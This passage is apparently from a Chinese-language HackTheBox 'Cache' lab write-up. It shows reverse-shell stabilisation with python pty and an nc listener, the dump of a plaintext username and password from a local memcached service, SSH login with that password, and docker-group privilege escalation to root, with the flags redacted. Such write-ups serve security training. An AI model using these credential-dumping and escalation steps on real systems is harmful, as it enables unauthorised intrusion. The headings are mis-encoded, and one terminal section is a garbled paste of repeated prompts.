<h3 id="5-å‡çº§shell"><a href="#5-å‡çº§shell" class="headerlink" title="5.å‡çº§shell"></a>5.å‡çº§shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">&lt;ain$ python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;        </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure>

<h3 id="6-å‡çº§ä¸ºäº¤äº’shell"><a href="#6-å‡çº§ä¸ºäº¤äº’shell" class="headerlink" title="6.å‡çº§ä¸ºäº¤äº’shell"></a>6.å‡çº§ä¸ºäº¤äº’shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;e/main$ [1]+  å·²åœæ­¢               nc -nvlp 6666        n$ </span><br><span class="line">[1]+: command not found</span><br><span class="line">&lt;ic_html/interface/main$ root@JIYE:~# stty raw -echo        </span><br><span class="line">root@JIYE:~#: command not found</span><br><span class="line">&lt;lic_html/interface/main$ root@JIYE:~# nc -nvlp 6666        </span><br><span class="line">root@JIYE:~#: command not found</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">&lt;cache:/var/www/hms.htb/public_html/interface/main$         </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;cache:/var/www/hms.htb/public_html/interface/main$         </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;/var/www/hms.htb/public_html/interface/main$ whoami        </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ www-data</span><br><span class="line">www-data: command not found</span><br><span class="line">&lt;@cache:/var/www/hms.htb/public_html/interface/main$        </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure>

<h3 id="7-åˆ‡æ¢åˆ°ashç”¨æˆ·å¾—åˆ°flag"><a href="#7-åˆ‡æ¢åˆ°ashç”¨æˆ·å¾—åˆ°flag" class="headerlink" title="7.åˆ‡æ¢åˆ°ashç”¨æˆ·å¾—åˆ°flag"></a>7.åˆ‡æ¢åˆ°ashç”¨æˆ·å¾—åˆ°flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@cache:/home$ cd ash</span><br><span class="line">www-data@cache:/home/ash$ ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  user.txt</span><br><span class="line">www-data@cache:/home/ash$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">www-data@cache:/home/ash$ su ash</span><br><span class="line">Password: </span><br><span class="line">ash@cache:~$ whoami</span><br><span class="line">ash</span><br><span class="line">ash@cache:~$ pwd</span><br><span class="line">/home/ash</span><br><span class="line">ash@cache:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  user.txt</span><br><span class="line">ash@cache:~$ cat user.txt </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">ash@cache:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x12-ææƒ"><a href="#0x12-ææƒ" class="headerlink" title="0x12.ææƒ"></a>0x12.ææƒ</h2><h3 id="1-æŸ¥çœ‹ç›‘å¬ç«¯å£"><a href="#1-æŸ¥çœ‹ç›‘å¬ç«¯å£" class="headerlink" title="1.æŸ¥çœ‹ç›‘å¬ç«¯å£"></a>1.æŸ¥çœ‹ç›‘å¬ç«¯å£</h3><p><code>googleå‘ç°11211ç«¯å£ä¸ºmemcacheæœåŠ¡</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ash@cache:/$ ss -lnt</span><br><span class="line">State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    </span><br><span class="line">LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       </span><br><span class="line">LISTEN   0         128               127.0.0.1:11211            0.0.0.0:*       </span><br><span class="line">LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       </span><br><span class="line">LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       </span><br><span class="line">LISTEN   0         128                       *:80                     *:*       </span><br><span class="line">LISTEN   0         128                    [::]:22                  [::]:*       </span><br><span class="line">ash@cache:/$</span><br></pre></td></tr></table></figure>

<h3 id="2-memcacheå‚è€ƒ"><a href="#2-memcacheå‚è€ƒ" class="headerlink" title="2.memcacheå‚è€ƒ"></a>2.<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3BlbmV0cmF0aW9uLXRlc3Rpbmctb24tbWVtY2FjaGVkLXNlcnZlci8=">memcacheå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></h3><blockquote>
<p>å¾—åˆ°luffyç”¨æˆ·ä¸å¯†ç 0n3_p1ec3</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ash@cache:/$ telnet 127.0.0.1 11211</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">stats</span><br><span class="line">STAT pid 987</span><br><span class="line">STAT uptime 1807</span><br><span class="line">STAT time 1601548108</span><br><span class="line">STAT version 1.5.6 Ubuntu</span><br><span class="line">STAT libevent 2.1.8-stable</span><br><span class="line">STAT pointer_size 64</span><br><span class="line">STAT rusage_user 0.153965</span><br><span class="line">STAT rusage_system 0.193444</span><br><span class="line">STAT max_connections 1024</span><br><span class="line">STAT curr_connections 1</span><br><span class="line">STAT total_connections 32</span><br><span class="line">STAT rejected_connections 0</span><br><span class="line">STAT connection_structures 2</span><br><span class="line">STAT reserved_fds 20</span><br><span class="line">STAT cmd_get 0</span><br><span class="line">STAT cmd_set 150</span><br><span class="line">STAT cmd_flush 0</span><br><span class="line">STAT cmd_touch 0</span><br><span class="line">STAT get_hits 0</span><br><span class="line">STAT get_misses 0</span><br><span class="line">STAT get_expired 0</span><br><span class="line">STAT get_flushed 0</span><br><span class="line">STAT delete_misses 0</span><br><span class="line">STAT delete_hits 0</span><br><span class="line">STAT incr_misses 0</span><br><span class="line">STAT incr_hits 0</span><br><span class="line">STAT decr_misses 0</span><br><span class="line">STAT decr_hits 0</span><br><span class="line">STAT cas_misses 0</span><br><span class="line">STAT cas_hits 0</span><br><span class="line">STAT cas_badval 0</span><br><span class="line">STAT touch_hits 0</span><br><span class="line">STAT touch_misses 0</span><br><span class="line">STAT auth_cmds 0</span><br><span class="line">STAT auth_errors 0</span><br><span class="line">STAT bytes_read 4597</span><br><span class="line">STAT bytes_written 1200</span><br><span class="line">STAT limit_maxbytes 67108864</span><br><span class="line">STAT accepting_conns 1</span><br><span class="line">STAT listen_disabled_num 0</span><br><span class="line">STAT time_in_listen_disabled_us 0</span><br><span class="line">STAT threads 4</span><br><span class="line">STAT conn_yields 0</span><br><span class="line">STAT hash_power_level 16</span><br><span class="line">STAT hash_bytes 524288</span><br><span class="line">STAT hash_is_expanding 0</span><br><span class="line">STAT slab_reassign_rescues 0</span><br><span class="line">STAT slab_reassign_chunk_rescues 0</span><br><span class="line">STAT slab_reassign_evictions_nomem 0</span><br><span class="line">STAT slab_reassign_inline_reclaim 0</span><br><span class="line">STAT slab_reassign_busy_items 0</span><br><span class="line">STAT slab_reassign_busy_deletes 0</span><br><span class="line">STAT slab_reassign_running 0</span><br><span class="line">STAT slabs_moved 0</span><br><span class="line">STAT lru_crawler_running 0</span><br><span class="line">STAT lru_crawler_starts 2040</span><br><span class="line">STAT lru_maintainer_juggles 3984</span><br><span class="line">STAT malloc_fails 0</span><br><span class="line">STAT log_worker_dropped 0</span><br><span class="line">STAT log_worker_written 0</span><br><span class="line">STAT log_watcher_skipped 0</span><br><span class="line">STAT log_watcher_sent 0</span><br><span class="line">STAT bytes 371</span><br><span class="line">STAT curr_items 5</span><br><span class="line">STAT total_items 150</span><br><span class="line">STAT slab_global_page_pool 0</span><br><span class="line">STAT expired_unfetched 0</span><br><span class="line">STAT evicted_unfetched 0</span><br><span class="line">STAT evicted_active 0</span><br><span class="line">STAT evictions 0</span><br><span class="line">STAT reclaimed 0</span><br><span class="line">STAT crawler_reclaimed 0</span><br><span class="line">STAT crawler_items_checked 28</span><br><span class="line">STAT lrutail_reflocked 0</span><br><span class="line">STAT moves_to_cold 150</span><br><span class="line">STAT moves_to_warm 0</span><br><span class="line">STAT moves_within_lru 0</span><br><span class="line">STAT direct_reclaims 0</span><br><span class="line">STAT lru_bumps_dropped 0</span><br><span class="line">END</span><br><span class="line">get user</span><br><span class="line">VALUE user 0 5</span><br><span class="line">luffy</span><br><span class="line">END</span><br><span class="line">get passwd       </span><br><span class="line">VALUE passwd 0 9</span><br><span class="line">0n3_p1ec3</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-luffyç™»å…¥"><a href="#3-luffyç™»å…¥" class="headerlink" title="3.luffyç™»å…¥"></a>3.luffyç™»å…¥</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ash@cache:/$ ssh luffy@127.0.0.1</span><br><span class="line">The authenticity of host &#x27;127.0.0.1 (127.0.0.1)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &#x27;127.0.0.1&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">luffy@127.0.0.1&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-109-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Thu Oct  1 10:34:55 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:              181</span><br><span class="line">  Usage of /:   75.0% of 8.06GB   Users logged in:        0</span><br><span class="line">  Memory usage: 12%               IP address for ens160:  10.10.10.188</span><br><span class="line">  Swap usage:   0%                IP address for docker0: 172.17.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">110 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Wed May  6 08:54:44 2020 from 10.10.14.3</span><br><span class="line">luffy@cache:~$ </span><br><span class="line">luffy@cache:~$ whoami</span><br><span class="line">luffy</span><br><span class="line">luffy@cache:~$uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)</span><br><span class="line">luffy@cache:~$</span><br></pre></td></tr></table></figure>

<h3 id="4-dockerææƒ"><a href="#4-dockerææƒ" class="headerlink" title="4.dockerææƒ"></a>4.dockerææƒ</h3><p><code>å¯ä»¥çœ‹åˆ°luffyå±äºdockerç”¨æˆ·ç»„</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZG9ja2VyLw==">dockerææƒå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br><span class="line">root@386a1a19658b:/# </span><br><span class="line">root@386a1a19658b:/# </span><br><span class="line">root@386a1a19658b:/# cd</span><br><span class="line">root@386a1a19658b:~# pwd</span><br><span class="line">/root</span><br><span class="line">root@386a1a19658b:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@386a1a19658b:~# cat root.txt </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">root@386a1a19658b:~#</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
</search>
